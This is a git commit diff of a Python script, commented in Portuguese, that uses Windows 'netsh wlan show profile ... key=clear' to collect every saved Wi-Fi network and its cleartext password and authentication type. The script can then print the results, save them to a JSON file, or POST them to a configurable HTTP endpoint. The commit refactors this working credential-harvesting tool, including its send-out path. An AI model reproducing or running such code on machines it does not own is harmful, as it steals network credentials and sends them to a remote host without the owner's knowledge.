d76acb28b93baa6941bc09e51882242ab891207b
Rafael Doddi <rafasdoddi@gmail.com>
2022-08-24 15:49:21 -0300

    Updates

--- main.py
+++ main.py
@@ -3,27 +3,22 @@ import json
 import requests
 import subprocess
 
-# ENDPOINT para onde o resultado deve ser enviado (opcional, mas se colocar um endpoint, mude a variável da linha 11 para 'True')
-endpoint = '<ENDPOINT>'
-
-# True para salvar no diretório onde o script foi executado e False para não salvar
-salvar = False
-
-# True para enviar para o ENDPOINT e False para não enviar
-enviar = False
-
-# True para exibir o resultado e False para não exibir
-exibir_resultado = True
+# ENDPOINT para onde o resultado deve ser enviado (opcional, mas se colocar um ENDPOINT, mude a variável da linha 8 para 'True')
+ENDPOINT = 'http://localhost'
+ENVIAR_RESULTADO = False
+SALVAR_RESULTADO = False
+EXIBIR_RESULTADO = True
 
 command = 'netsh wlan show profile'
 
 # Muda a codificação para conseguir decodificar o output
-subprocess.run('chcp 65001', shell=True, capture_output=True)
+decod = 'chcp 65001'
+subprocess.run(decod.split(), shell=True, capture_output=True)
 
 def coleta_profiles():
     """ Coleta os perfis salvos no computador """
     profile_list = list()
-    profiles = subprocess.run(command, shell=True, capture_output=True).stdout.decode()
+    profiles = subprocess.run(command.split(), capture_output=True).stdout.decode()
     for profile in re.findall(r':\s\w.*', profiles):
         profile_list.append(profile[2:].strip())
     return profile_list
@@ -34,11 +29,14 @@ def coleta_senhas(profile_list):
     protegido = dict()
     livre = list()
     for ssid in profile_list:
-        senha = subprocess.run(f'{command} "{ssid}" key=clear', shell=True, capture_output=True).stdout.decode()
+        new_c = command + f' "{ssid}" key=clear'
+        senha = subprocess.run(new_c.split(), capture_output=True).stdout.decode()
         try:
-            pwd = re.search('da Chave.*', senha).group().strip()
+            pwd = re.search(r'da Chave.*', senha).group().strip()
             pwd = pwd[pwd.index(':')+2:]
-            protegido[ssid] = pwd
+            autenticacao = re.search(r'Autenticação\s+:\s.*', senha).group().strip()
+            autenticacao = autenticacao[autenticacao.index(':')+2:]
+            protegido[ssid] = {"senha": pwd, "autenticacao": autenticacao}
         except:
             livre.append(ssid)
     resultado["quantidade"] = {"livre": len(livre), "protegido": len(protegido), "total": len(protegido) + len(livre)}
@@ -52,33 +50,35 @@ def salva_resultado(resultado):
         json.dump(resultado, wifi_pwds, indent=4)
 
 def envia_resultado(resultado):
-    """ Envia o resultado para algum endpoint indicado pelo usuário """
+    """ Envia o resultado para algum ENDPOINT indicado pelo usuário """
     data = {"resultado": resultado}
-    response = requests.post(endpoint, json=data)
+    response = requests.post(ENDPOINT, json=data)
     return response
 
-if __name__ == '__main__':
+def main():
     print("\n[*] Coletando perfis...")
     profile_list = coleta_profiles()
-    print("[+] Perfis coletados...")
     print("[*] Coletando senhas...")
     resultado = coleta_senhas(profile_list)
-    print("[+] Senhas coletadas...")
-    if exibir_resultado:
-        print("\n"+"#"*55)
+    if EXIBIR_RESULTADO:
+        print("[*] Exibindo resultado...\n\n"+"#"*55)
         print(json.dumps(resultado, indent=4))
         print("#"*55)
-    if salvar:
+    if SALVAR_RESULTADO:
         print("\n[*] Salvando...")
         salva_resultado(resultado)
-        print("[+] Salvo...")
-    if enviar and endpoint:
+        print("[+] Salvo em 'Senhas_Wi-fi.json'...")
+    if ENVIAR_RESULTADO and ENDPOINT:
         print("\n[*] Enviando resultado...")
         response = envia_resultado(resultado)
         if response:
             print("[*] Status code: {}".format(response.status_code))
             if response.status_code == 200:
-                print("[+] Enviado...")
+                print("[+] Enviado com sucesso...")
             else:
                 print("[-] Ocorreu algum erro: {}".format(response.text))
     print("\n[*] Finalizado...\n")
+
+
+if __name__ == '__main__':
+    main()
